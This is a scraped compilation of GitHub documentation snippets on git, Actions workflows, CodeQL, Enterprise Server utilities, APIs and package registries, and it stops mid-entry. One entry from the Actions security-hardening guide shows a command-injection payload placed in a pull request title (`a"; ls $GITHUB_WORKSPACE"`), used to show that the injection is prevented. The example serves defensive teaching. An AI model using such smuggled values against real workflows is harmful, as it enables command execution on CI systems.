octo-org/another-repo/.github/workflows/workflow.yml@v1\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository with Git\nDESCRIPTION: This command clones a Git repository from GitHub or GitHub Enterprise Server to the local machine.  It requires Git to be installed. Replace `YOUR-HOSTNAME`, `YOUR-USERNAME`, and `YOUR-REPOSITORY` with the appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://{% ifversion ghes %}YOUR-HOSTNAME{% else %}github.com{% endif %}/YOUR-USERNAME/YOUR-REPOSITORY.git\ncd YOUR-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Filtering Queries by Severity in CodeQL\nDESCRIPTION: This configuration file runs queries that generate alerts of severity error. It selects default queries, queries in `./my-queries`, and the default suite in `codeql/java-queries`, then excludes queries that generate warnings or recommendations.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/code-scanning/example-configuration-files.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nqueries:\n  - name: Use an in-repository CodeQL query pack (run queries in the my-queries directory)\n    uses: ./my-queries\npacks:\n  - codeql/java-queries\nquery-filters:\n- exclude:\n    problem.severity:\n      - warning\n      - recommendation\n```\n\n----------------------------------------\n\nTITLE: Pre-checking GitHub Actions Storage Configuration (ghe-actions-precheck)\nDESCRIPTION: This command tests the blob storage configuration for GitHub Actions. It allows you to verify storage settings before enabling GitHub Actions.  Requires the provider (`-p`) and connection string (`-cs`) as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_67\n\nLANGUAGE: shell\nCODE:\n```\nghe-actions-precheck -p [PROVIDER] -cs [\"CONNECTION-STRING\"]\n```\n\n----------------------------------------\n\nTITLE: Checking Docker service status with systemctl\nDESCRIPTION: This command uses `systemctl` to check whether the Docker service is active on Linux. It requires `sudo` privileges.  It's used to verify that Docker is running before running jobs that require containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n$ sudo systemctl is-active docker.service\n```\n\n----------------------------------------\n\nTITLE: Updating a Group Attribute via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP PATCH request used to update an individual attribute for an existing group in GitHub using the SCIM API. The request updates only the specified attribute.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_5\n\nLANGUAGE: HTTP\nCODE:\n```\nPATCH /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups/{scim_group_id}\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Artifacts Syntax\nDESCRIPTION: This YAML snippet showcases the syntax for defining artifacts in GitLab CI/CD. It contains a `script` section and an `artifacts` section that specifies the paths to be uploaded as artifacts. In this example, `math-homework.txt` is specified as an artifact.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nscript:\nartifacts:\n  paths:\n    - math-homework.txt\n```\n\n----------------------------------------\n\nTITLE: Configure GitHub Actions Job\nDESCRIPTION: This YAML snippet configures a GitHub Actions job named 'job1'. It specifies the 'ubuntu-latest' runner to execute the job and sets default settings for run steps. The default shell is set to 'bash', and the default working directory is './scripts'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/setting-default-run-value-for-job-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash\n        working-directory: ./scripts\n```\n\n----------------------------------------\n\nTITLE: Updating the gh-ado2gh GitHub CLI Extension\nDESCRIPTION: This command updates the `gh-ado2gh` GitHub CLI extension to the latest version. It ensures that you have the most recent features and bug fixes for the migration tool.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh extension upgrade github/gh-ado2gh\n```\n\n----------------------------------------\n\nTITLE: Checking GitHub Enterprise Host Connectivity\nDESCRIPTION: This command verifies SSH connectivity between the backup host and the GitHub Enterprise instance.  It uses the `ghe-host-check` utility located in the `./bin` directory.  Successful execution confirms that the backup host can communicate with the GHE instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n./bin/ghe-host-check\n```\n\n----------------------------------------\n\nTITLE: Creating and Checking out gh-pages Branch in Shell\nDESCRIPTION: This shell command creates a new orphan branch named `gh-pages`, switches to it, and then removes all files from the working directory. This effectively creates a clean branch for publishing.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit checkout --orphan gh-pages\ngit rm -rf .\n```\n\n----------------------------------------\n\nTITLE: Analyzing CodeQL Database\nDESCRIPTION: This command analyzes a CodeQL database using specified queries and generates a results file in a specified format. The database, format, and output parameters must be specified.  Additional options can further customize the analysis.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database analyze <database> --format=<format> --output=<output> <query-specifiers>...\n```\n\n----------------------------------------\n\nTITLE: Requiring Ruby dependencies\nDESCRIPTION: These lines require necessary Ruby libraries for making HTTP requests, working with JSON, parsing URIs, and manipulating files. These libraries are part of the Ruby standard library and provide functionalities for the CLI application.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"net/http\"\nrequire \"json\"\nrequire \"uri\"\nrequire \"fileutils\"\n```\n\n----------------------------------------\n\nTITLE: Scheduling a Workflow with Cron in GitHub Actions\nDESCRIPTION: This code snippet shows how to schedule a GitHub Actions workflow using cron syntax. The `on.schedule` section defines when the workflow will run automatically, using a cron expression. The cron expression specifies the schedule for the workflow to run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  schedule:\n    - cron: '*/15 * * * 1-5'\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting: Remote origin already exists\nDESCRIPTION: This snippet demonstrates the error message when attempting to add a remote with a name that already exists. It also includes a description of the error and suggestions for how to solve the error.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote add origin https://{% data variables.product.product_url %}/octocat/Spoon-Knife.git\n> fatal: remote origin already exists.\n```\n\n----------------------------------------\n\nTITLE: CLI Content Liquid Tag with Shell Code\nDESCRIPTION: Defines a section of content specifically for the `cli` tool. This example showcases how to include shell code snippets within the CLI content block. The shell code is wrapped in a ````shell```` block for proper formatting.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-specific.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n{% cli %}\n\nthis is cli content\n\n```shell\ncli content\n```\n\n{% endcli %}\n```\n\n----------------------------------------\n\nTITLE: Bulk Reclaiming Mannequins with gei extension (GitHub CLI)\nDESCRIPTION: This command reclaims mannequins in bulk using a CSV file. Replace DESTINATION with the target GitHub organization name and FILENAME.csv with the name of the CSV file containing the mannequin mappings.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh gei reclaim-mannequin --github-target-org DESTINATION --csv FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Create Translated Page Tree\nDESCRIPTION: This snippet shows where the translated page tree is created by iterating over the English page tree. For each English file, the code attempts to locate and read the corresponding translated source, swapping the content with the translated version.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/frame/lib/page-data.js#L56-L67\n```\n\n----------------------------------------\n\nTITLE: Making a GraphQL API request with Octokit\nDESCRIPTION: This code demonstrates how to make a GraphQL API request using the authenticated `octokit` instance. It uses the `octokit.graphql` method to execute a GraphQL query. The example query retrieves the login of the viewer.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nawait octokit.graphql(`\n  query {\n    viewer {\n      login\n    }\n  }\n  `)\n```\n\n----------------------------------------\n\nTITLE: Script Injection Prevention Example - Shell\nDESCRIPTION: This shell output confirms that an attempt to inject a script via a pull request title (`a\"; ls $GITHUB_WORKSPACE\"`) was unsuccessful due to the use of an intermediate environment variable in the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n   env:\n     TITLE: a\"; ls $GITHUB_WORKSPACE\"\nPR title did not start with 'octocat'\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Else Clause and Right Whitespace Trim\nDESCRIPTION: This snippet includes an `else` clause within the `ifversion` block and uses right whitespace trim on the end of the else block. It renders 'Alpha' if `ghes < 2.14`, otherwise 'Bravo'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_6\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.14 %}\nAlpha\n{% else %}\nBravo{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Scheduling a New Upgrade Package Installation (Shell)\nDESCRIPTION: Schedules a new installation for an upgrade package using the `ghe-upgrade-scheduler` utility. The `-c` option specifies the cron expression, and `UPGRADE-PACKAGE-FILENAME` specifies the upgrade package. Replace the cron expression and filename.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_104\n\nLANGUAGE: shell\nCODE:\n```\nghe-upgrade-scheduler -c \"0 2 15 12 *\" UPGRADE-PACKAGE-FILENAME\n```\n\n----------------------------------------\n\nTITLE: Generating CSR (ghe-ssl-generate-csr)\nDESCRIPTION: This command generates a private key and certificate signing request (CSR) for GitHub Enterprise Server. You can then share the CSR with a certificate authority.  Use the `-h` flag for more information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_29\n\nLANGUAGE: Shell\nCODE:\n```\nghe-ssl-generate-csr\n```\n\n----------------------------------------\n\nTITLE: Exporting collectd data with ghe-export-graphs\nDESCRIPTION: This shell command exports collectd data stored in RRD databases to an XML format, packages it into a tarball, and then copies it to the local machine using `scp`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/configuring-collectd-for-your-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@[hostname] -- 'ghe-export-graphs' && scp -P 122 admin@[hostname]:~/graphs.tar.gz .\n```\n\n----------------------------------------\n\nTITLE: Verifying git-sizer installation\nDESCRIPTION: This snippet verifies that `git-sizer` is installed correctly by running the command `git-sizer --version`. Successful installation will produce output similar to `git-sizer release 1.5.0`. This is a prerequisite for measuring repository size.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/overview/planning-your-migration-to-github.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit-sizer –version\n```\n\n----------------------------------------\n\nTITLE: GitHub OAuth Authorize URL for GitHub Enterprise Server\nDESCRIPTION: This code snippet presents the OAuth authorization URL for GitHub Enterprise Server (GHES). Applications interacting with GHES need to use this URL during the OAuth flow to authenticate users. The `HOSTNAME` variable is a placeholder for the actual hostname of the GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/making-your-github-app-available-for-github-enterprise-server.md#_snippet_2\n\nLANGUAGE: none\nCODE:\n```\n`https://github.com/login/oauth/authorize` | `https://HOSTNAME/login/oauth/authorize`\n```\n\n----------------------------------------\n\nTITLE: Executing a GitHub CLI extension\nDESCRIPTION: This shell command executes a GitHub CLI extension.  It calls the `gh` command followed by the extension's name.  The extension's name is determined based on the `EXTENSION-NAME` placeholder.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_16\n\nLANGUAGE: Shell\nCODE:\n```\ngh EXTENSION-NAME\n```\n\n----------------------------------------\n\nTITLE: Fetching API V2 with curl\nDESCRIPTION: This shell code snippet uses curl to make a request to the `/api/v2` endpoint. The `HOSTNAME` placeholder will *not* be dynamically replaced because the `replacedomain` annotation is absent. It depends on curl being installed on the system.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/replace-domain.md#_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://HOSTNAME/api/v2\n```\n\n----------------------------------------\n\nTITLE: Commit Subtree Merge\nDESCRIPTION: Commits the changes made by the `git read-tree` command, effectively adding the remote repository's history as a subdirectory within the local repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit commit -m \"Subtree merged in spoon-knife\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Git Repository (Legacy)\nDESCRIPTION: This snippet initializes a local directory as a Git repository for older versions of Git (2.27.1 or earlier). It uses `git init` to create the repository and `git symbolic-ref` to set the default branch to `main`.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit init && git symbolic-ref HEAD refs/heads/main\n```\n\n----------------------------------------\n\nTITLE: Defining RepositoryDiscussionCommentAuthor interface in GraphQL\nDESCRIPTION: Defines the `RepositoryDiscussionCommentAuthor` interface, implemented by the `User` and `Organization` types, providing a `repositoryDiscussionComments` field for retrieving discussion comments authored by the user. It accepts arguments for pagination and filtering by repository ID and whether the comments were marked as the answer.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_13\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nRepresents an author of discussion comments in repositories.\n\"\"\"\ninterface RepositoryDiscussionCommentAuthor {\n  \"\"\"\n  Discussion comments this user has authored.\n  \"\"\"\n  repositoryDiscussionComments(\n    \"\"\"\n    Returns the elements in the list that come after the specified cursor.\n    \"\"\"\n    after: String\n\n    \"\"\"\n    Returns the elements in the list that come before the specified cursor.\n    \"\"\"\n    before: String\n\n    \"\"\"\n    Returns the first _n_ elements from the list.\n    \"\"\"\n    first: Int\n\n    \"\"\"\n    Returns the last _n_ elements from the list.\n    \"\"\"\n    last: Int\n\n    \"\"\"\n    Filter discussion comments to only those that were marked as the answer\n    \"\"\"\n    onlyAnswers: Boolean = false\n\n    \"\"\"\n    Filter discussion comments to only those in a specific repository.\n    \"\"\"\n    repositoryId: ID\n  ): DiscussionCommentConnection!\n}\n\n```\n\n----------------------------------------\n\nTITLE: Sorting search alphabetically by task on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to sort models alphabetically by name, filtered by task 'chat-completion' using `sort:name-asc` and `in:task chat-completion`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_20\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=sort:name-asc+in:task+chat-completion&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Syntax for Environment Variable (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to define an environment variable within a job in a GitHub Actions workflow. It sets the `MAVEN_PATH` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'\n```\n\n----------------------------------------\n\nTITLE: Adding User ID to GPG Key\nDESCRIPTION: This command is used within the GPG command-line interface to add a new user ID to the currently selected GPG key. This allows you to associate an email address and other identifying information with the GPG key for signing commits.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/associating-an-email-with-your-gpg-key.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngpg> adduid\n```\n\n----------------------------------------\n\nTITLE: Yarn Berry: Configuring npmRegistryServer in .yarnrc.yml\nDESCRIPTION: This snippet shows how to configure the `npmRegistryServer` in the `.yarnrc.yml` file to point to a private registry. This configuration ensures that Yarn Berry uses the specified private registry to resolve dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nnpmRegistryServer: \"https://private_registry_url\"\n```\n\n----------------------------------------\n\nTITLE: Example Response of createMigrationSource Mutation\nDESCRIPTION: This JSON represents a sample response from the `createMigrationSource` GraphQL mutation.  It includes the ID, name, URL, and type of the created migration source, which will be used in subsequent steps.  The ID is crucial for identifying the source in later migration commands.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": {\n    \"createMigrationSource\": {\n      \"migrationSource\": {\n        \"id\": \"MS_kgDaACRjZTY5NGQ1OC1mNDkyLTQ2NjgtOGE1NS00MGUxYTdlZmQwNWQ\",\n        \"name\": \"GHES Source\",\n        \"url\": \"https://my-ghes-hostname.com\",\n        \"type\": \"GITHUB_ARCHIVE\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mirror-Pushing a Git Repository\nDESCRIPTION: Mirrors a local Git repository to a remote repository using `git push --mirror`. This pushes all branches, tags, and other references from the local repository to the remote repository, effectively creating an exact copy.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/detaching-a-fork.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit --git-dir FORK.git push --mirror https://{% data variables.product.product_url %}/EXAMPLE-USER/FORK.git\n```\n\n----------------------------------------\n\nTITLE: Running the linter on specific files/directories\nDESCRIPTION: This command runs the content linter on the specified files or directories. Multiple paths can be specified, separated by spaces.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- \\\n  --paths content/FILENAME.md content/DIRECTORY\n```\n\n----------------------------------------\n\nTITLE: Setting npm scoped registry via command line\nDESCRIPTION: This snippet shows how to configure a scoped npm registry using the `npm config set` command. Replace `<org-name>` with the organization name and `<url>` with the private registry URL.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nnpm config set @<org-name>:registry <url>\n```\n\n----------------------------------------\n\nTITLE: Upgrading a CodeQL dataset using the CLI\nDESCRIPTION: This command upgrades a raw QL dataset to be compatible with the current CodeQL tools. It functions similarly to `codeql database upgrade`, but operates directly on the dataset rather than an entire database. The dataset path is a mandatory argument.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/dataset-upgrade.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql dataset upgrade [--threads=<num>] [--ram=<MB>] <options>... -- <dataset>\n```\n\n----------------------------------------\n\nTITLE: Describing renamed Event Properties\nDESCRIPTION: Describes the `rename` object and its properties for the `renamed` event. The rename object contains information about the old and new name of the issue or pull request title.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/issue-event-types.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n`rename` | `object` | The name details.\n`rename[from]` | `string` | The previous name.\n`rename[to]` | `string` | The new name.\n```\n\n----------------------------------------\n\nTITLE: Launching GitHub Desktop on macOS\nDESCRIPTION: Launches GitHub Desktop on macOS, opening the repository located at the specified path.  The first command launches GitHub Desktop with the specified repository path. The second example changes the current directory to the repository and then launches GitHub Desktop.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/overview/launching-github-desktop-from-the-command-line.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngithub /PATH/TO/REPO\n```\n\nLANGUAGE: shell\nCODE:\n```\n$ cd /PATH/TO/REPO\n[repo]$ github .\n```\n\n----------------------------------------\n\nTITLE: Verifying Git LFS Version\nDESCRIPTION: This snippet demonstrates how to verify if Git LFS is installed by running the `git lfs --version` command in the terminal. It requires Git LFS to be installed and accessible in the system's PATH. The expected output format is `git-lfs/version (GitHub; os architecture; go version)`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/migrations/confirm-git-lfs-installed.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit lfs --version\n```\n\n----------------------------------------\n\nTITLE: Removing File: Git rm Cached\nDESCRIPTION: This command stages a giant file for removal from the Git repository while leaving the file on disk.  It is used when removing a file that was added in the most recent unpushed commit.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/about-large-files-on-github.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git rm --cached GIANT_FILE\n# Stage our giant file for removal, but leave it on disk\n```\n\n----------------------------------------\n\nTITLE: Excluding Queries by Problem Severity - YAML\nDESCRIPTION: This example selects all queries with `@kind problem` from the `my-custom-queries` directory, excluding those with `@problem.severity recommendation`. This allows filtering based on a specific property within the problem.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: my-custom-queries\n- include:\n    kind: problem\n- exclude:\n    problem.severity: recommendation\n```\n\n----------------------------------------\n\nTITLE: Describing unassigned Event Properties\nDESCRIPTION: Describes the `assignee` and `assigner` properties for the `unassigned` event. `assignee` represents the user who was unassigned, and `assigner` represents the user who performed the unassignment.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/issue-event-types.md#_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n`assignee` | `object` | The person unassigned from this issue.\n`assigner` | `object` | The person who performed the unassignment for this issue. This field is available in the REST API for issue events but not the REST API for timeline events.\n```\n\n----------------------------------------\n\nTITLE: Listing available skills in GitHub Copilot Chat\nDESCRIPTION: This snippet demonstrates how to obtain a list of the currently available skills within GitHub Copilot Chat. The AI model processes the request and presents the list of skills it has access to. This is useful for understanding Copilot's capabilities.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/copilot-chat/asking-github-copilot-questions-in-github.md#_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\nWhat skills are available?\n```\n\n----------------------------------------\n\nTITLE: YAML Scheduled Workflow Example\nDESCRIPTION: This YAML snippet demonstrates a properly formatted scheduled workflow in GitHub Actions.  It uses the `cron` syntax to specify when the workflow should run. The example uses `40 19 * * *` to avoid running on the hour which are often congested.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  schedule:\n    - cron:  \"40 19 * * *\"\n```\n\n----------------------------------------\n\nTITLE: Checking Docker installation path with which command\nDESCRIPTION: This command uses the `which` command to check the installation path of the Docker engine.  It can be used to determine if Docker was installed using `snap`, which can cause issues with passing environment variables to containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\n$ which docker\n```\n\n----------------------------------------\n\nTITLE: Listing Accepted Assignments using GitHub CLI\nDESCRIPTION: This command displays a list of assignments that have been accepted by students, along with information about the student's submissions. It requires the GitHub CLI and the GitHub Classroom extension. The output shows accepted assignments and related student details in the console.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom accepted-assignments\n```\n\n----------------------------------------\n\nTITLE: Enabling Automatic Hourly Rebalancing\nDESCRIPTION: This snippet demonstrates how to enable automatic hourly rebalancing of jobs by setting the `app.cluster-rebalance.enabled` configuration value to `true` using the `ghe-config` utility. This configures the system to automatically rebalance jobs on an hourly schedule.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config app.cluster-rebalance.enabled true\n```\n\n----------------------------------------\n\nTITLE: Restarting the Server\nDESCRIPTION: This command is used to restart the Ruby server from the terminal. It first stops the server if it's running (using Ctrl-C) and then restarts it. This is commonly used when code changes require the server to be reloaded.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_40\n\nLANGUAGE: shell\nCODE:\n```\nruby server.rb\n```\n\n----------------------------------------\n\nTITLE: Markdown Comment for Autogenerated Content\nDESCRIPTION: This markdown comment is used as a delimiter in the `content/rest/overview/endpoints-available-for-github-apps.md` file.  Content after this comment is automatically generated by the GitHub Apps pipeline and will be overwritten on subsequent runs. Content writers can add an introduction paragraph above the comment.\nSOURCE: https://github.com/github/docs/blob/main/src/github-apps/README.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n<!-- Content after this section is automatically generated -->\n```\n\n----------------------------------------\n\nTITLE: ENTRYPOINT example without variable substitution\nDESCRIPTION: This Dockerfile example demonstrates the _exec_ form of the `ENTRYPOINT` instruction, which does not perform environment variable substitution. Thus, `$GITHUB_SHA` will be printed verbatim instead of the value of the variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions.md#_snippet_4\n\nLANGUAGE: dockerfile\nCODE:\n```\nENTRYPOINT [\"echo $GITHUB_SHA\"]\n```\n\n----------------------------------------\n\nTITLE: Initializing a qlpack using codeql pack init\nDESCRIPTION: This command initializes a qlpack in the specified directory. The pack will be created in a child directory of the specified directory.  The package name is mandatory, and scope is only required if the pack is to be published.  Available since `v2.6.0`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-init.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack init [--dir=<dir>] [--extractor=<extractor>] <options>... -- <package-name>\n```\n\n----------------------------------------\n\nTITLE: npmrc Configuration - Shell\nDESCRIPTION: This is the configuration for the .npmrc file, which sets the authentication token and registry for the @octocat scope to GitHub Packages.  NODE_AUTH_TOKEN environment variable must be set with the appropriate token for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n@octocat:registry=https://npm.pkg.github.com\nalways-auth=true\n```\n\n----------------------------------------\n\nTITLE: Renaming Codespace with GitHub CLI\nDESCRIPTION: This command allows you to change the display name of a codespace using the GitHub CLI. Replace `PERMANENT-CODESPACE-NAME` with the permanent name of the codespace and `NEW-DISPLAY-NAME` with the desired new display name. Display names can be up to 48 characters.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/renaming-a-codespace.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace edit -c PERMANENT-CODESPACE-NAME -d 'NEW-DISPLAY-NAME'\n```\n\n----------------------------------------\n\nTITLE: Error Message: Namespace Character Limit - Bash\nDESCRIPTION: This bash snippet shows an error message indicating that the namespace exceeds the character limit of 63, likely within the `gha-runner-scale-set/templates/autoscalingrunnerset.yaml` template. This error suggests the namespace needs to be shortened.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:8:5): Namespace must have up to 63 characters\n```\n\n----------------------------------------\n\nTITLE: Forecasting usage for a specific Bamboo project\nDESCRIPTION: This snippet shows how to limit the forecast to a specific Bamboo project using the `--project` option.  It targets plans and deployment environments associated with the specified project key.\nSOURCE: 